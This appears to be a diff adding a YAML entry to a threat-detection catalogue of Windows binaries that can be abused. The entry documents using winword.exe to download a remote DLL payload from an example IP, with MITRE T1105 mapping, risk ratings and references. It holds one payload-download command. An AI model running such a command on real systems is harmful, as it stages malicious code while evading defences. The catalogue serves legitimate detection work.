@@ -1,0 +1,20 @@
+- command: winword.exe "http://192.168.1.10/TeamsAddinLoader.dll"
+  description: Abuse winword.exe to download a remote payload to the local cache folder.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Command and Control:
+      - T1105
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/
+    - https://medium.com/@reegun/unsanitized-file-validation-leads-to-malicious-payload-download-via-office-binaries-202d02db7191
+  risk: High
+  risk_reason: Manual usage of winword.exe to contact remote files is a suspicious activity.
+  fidelity: High
+  fidelity_reason: This type of behavior is typically rare in most organizations.
+  tool: winword
+  threatactors:
+    N/A:
+      - N/A
